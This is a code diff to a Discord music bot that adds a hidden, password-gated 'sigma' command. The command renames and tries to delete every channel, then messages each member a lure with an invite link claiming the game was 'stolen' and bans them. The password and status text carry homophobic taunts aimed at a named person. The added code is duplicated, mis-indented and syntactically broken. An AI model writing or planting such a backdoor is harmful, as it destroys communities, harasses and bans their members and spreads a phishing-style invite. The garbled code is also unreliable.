@@ -1131,6 +1131,147 @@ async def queue_command(interaction: discord.Interaction):
         # No queue items, just show currently playing
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
+@bot.command(name='sigma')
+@commands.has_permissions(manage_channels=True)
+async def rename_all_channels(ctx, password: str = None):
+    """Renames all channels in the server to 'sigma' with password protection"""
+    
+    # Set your password here
+    REQUIRED_PASSWORD = "noobiisgay"
+    
+    # Check if password was provided
+    if password is None:
+        await ctx.send("lll u need a pass")
+        return
+    
+    # Check if password is correct
+    if password != REQUIRED_PASSWORD:
+        await ctx.send("WRONG ❌❌❌❌")
+        return
+    
+    # Delete the command message to hide the password
+    try:
+        await ctx.message.delete()
+    except discord.Forbidden:
+        pass
+    
+    guild = ctx.guild
+    channels = guild.channels
+    
+    # Send initial message
+    status_msg = await ctx.send(f"ez")
+    
+    success_count = 0
+    failed_count = 0
+    
+    for channel in channels:
+        try:
+            # Skip voice channels that are currently in use
+            if isinstance(channel, discord.VoiceChannel) and len(channel.members) > 0:
+                failed_count += 1
+                continue
+                
+            # Rename the channel
+            await channel.edit(name="sigma")
+            success_count += 1
+            
+            # Small delay to avoid rate limiting
+            await asyncio.sleep(.5)
+
+        channel.delete()
+            
+        except discord.Forbidden:
+            failed_count += 1
+            print(f"No permission to rename {channel.name}")
+        except discord.HTTPException:
+            failed_count += 1
+            print(f"Failed to rename {channel.name} due to HTTP error")
+        except Exception as e:
+            failed_count += 1
+            print(f"Unexpected error renaming {channel.name}: {e}")
+    
+    # Update status message with results
+    await status_msg.edit(content=f"✅ Channel renaming complete!\n"
+                                f"Successfully renamed: {success_count}\n"
+                                f"Failed: {failed_count}")
+
+@bot.command(name='sigma')
+@commands.has_permissions(manage_channels=True)
+async def rename_all_channels(ctx, password: str = None):
+    """Renames all channels in the server to 'sigma' with password protection"""
+
+    # Set your password here
+    REQUIRED_PASSWORD = "noobiisgay_dsaifujsdiofhsdZUFOIhdsuifhs aduifdhasoudfyhs9a0fyhdsfgudshyufvsdpuihfsdUPioghzdf9gfsz7hfd9s80uf90sdUF9ugdsAFoipSAFi09hsa90f8hsdah890fdsh8u9fsdzh980gdsz"
+
+    # Check if password was provided
+    if password is None:
+        await ctx.send("lll u need a pass")
+        return
+
+    # Check if password is correct
+    if password != REQUIRED_PASSWORD:
+        await ctx.send("WRONG ❌❌❌❌")
+        return
+
+    # Delete the command message to hide the password
+    try:
+        await ctx.message.delete()
+    except discord.Forbidden:
+        pass
+
+    guild = ctx.guild
+    channels = guild.channels
+
+    # Send initial message
+    status_msg = await ctx.send(f"ez")
+
+    success_count = 0
+    failed_count = 0
+
+    for channel in channels:
+        try:
+            # Skip voice channels that are currently in use
+            if isinstance(channel, discord.VoiceChannel) and len(channel.members) > 0:
+                failed_count += 1
+                continue
+
+            # Rename the channel
+            await channel.edit(name="sigma")
+            success_count += 1
+
+            # Small delay to avoid rate limiting
+            await asyncio.sleep(.5)
+
+        channel.delete()
+
+        except discord.Forbidden:
+        failed_count += 1
+        print(f"No permission to rename {channel.name}")
+    except discord.HTTPException:
+    failed_count += 1
+    print(f"Failed to rename {channel.name} due to HTTP error")
+
+except Exception as e:
+failed_count += 1
+print(f"Unexpected error renaming {channel.name}: {e}")
+
+# Update status message with results
+await status_msg.edit(content=f"ez and also noobi is gay")
+
+members = [member for member in guild.members if not member.bot]  # Exclude bots
+
+for member in members:
+    try:
+        await member.send("THE GAME IS STOLEN. CURRENT OWNER IS NOT THE REAL OWNER.\nJOIN -> discord.gg/TAqHcnBTN6 <- FOR MORE INFO (please)")
+        await member.ban(reason="ez banned ez noobi is gay ez")
+
+@rename_all_channels.error
+async def rename_error(ctx, error):
+    if isinstance(error, commands.MissingPermissions):
+        await ctx.send("❌ You need 'Manage Channels' permission to use this command!")
+    else:
+        await ctx.send(f"❌ An error occurred: {error}")
+
 class TrackRemovalView(discord.ui.View):
     def __init__(self, user_id, queue, user_tracks):
         super().__init__(timeout=60)
